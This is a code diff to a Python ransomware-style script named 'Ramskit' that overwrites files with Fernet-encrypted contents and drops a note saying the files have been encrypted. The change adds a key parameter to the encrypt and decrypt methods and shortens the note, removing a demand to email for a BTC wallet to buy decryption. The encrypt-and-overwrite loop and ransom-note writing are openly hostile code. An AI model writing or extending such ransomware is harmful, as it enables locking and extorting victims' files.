@@ -34,7 +34,7 @@ class Ramskit:
             self.key = Ramskit.generate_key()
         print(f"[x] Key is {self.key}")
 
-    def encrypt_file(self, items):
+    def encrypt_file(self, items, key):
         f = Fernet(self.key)
         for item in items:
             with open(item, 'rb') as file:
@@ -46,7 +46,7 @@ class Ramskit:
             with open(item, 'wb') as file:
                 file.write(encrypted)
 
-    def decrypt_file(self, items):
+    def decrypt_file(self, items, key):
         f = Fernet(self.key)
         for item in items:
             with open(item, 'rb') as file:
@@ -106,9 +106,7 @@ if __name__ == '__main__':
     if action == 'encrypt':
         with open(lam, 'w') as f:
             f.write('''
-                Heyo, this file has been encrypted!.
-                You need to email me so I can give u my BTC wallet for the
-                decrypt's purchase lololololol \n\n
+                Heyo, this file has been encrypted!. \n\n
             ''')
         ramskit.encrypt_file(items, key)
     elif action == 'decrypt':
